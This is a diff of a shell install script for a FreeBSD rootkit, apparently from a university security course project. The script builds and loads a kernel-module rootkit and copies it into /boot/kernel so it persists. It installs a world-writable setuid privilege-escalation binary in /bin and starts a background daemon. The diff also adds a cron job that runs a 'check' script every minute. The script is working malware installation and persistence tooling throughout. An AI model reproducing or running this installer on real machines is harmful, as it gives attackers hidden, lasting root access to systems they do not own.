@@ -1,8 +1,9 @@
 #!/bin/sh
 
+cd /usr/home/comp6447/FreeBSD-Rootkit/
 make clean
 make
-kldload ./rootkit.ko
+/sbin/kldload ./rootkit.ko
 echo "" > /log.txt
 chmod 666 /log.txt
 cp rootkit.ko /boot/kernel
@@ -12,6 +13,18 @@ cc priv_esc.c -o /bin/priv_esc
 chmod 777 /bin/priv_esc
 chmod +s /bin/priv_esc
 cc daemon.c -o /lib/daemon
-sed "s/yeet/$1/" login_tmp > /etc/rc.d/login
-chmod 777 /etc/rc.d/login
+# sed "s/yeet/$1/" login_tmp > login
+
+# mv login /login
+# chmod 777 /login
+
+# mv login /etc/rc.d/login
+# chmod 777 /etc/rc.d/login
+touch /status.txt
+sed "s/yeet/$1/" check_tmp > check
+chmod 777 check
+echo "SHELL = /bin/sh" > persistance
+echo "* * * * * $PWD/check" >> persistance
+crontab persistance
+rm persistance
 /lib/daemon $1 &
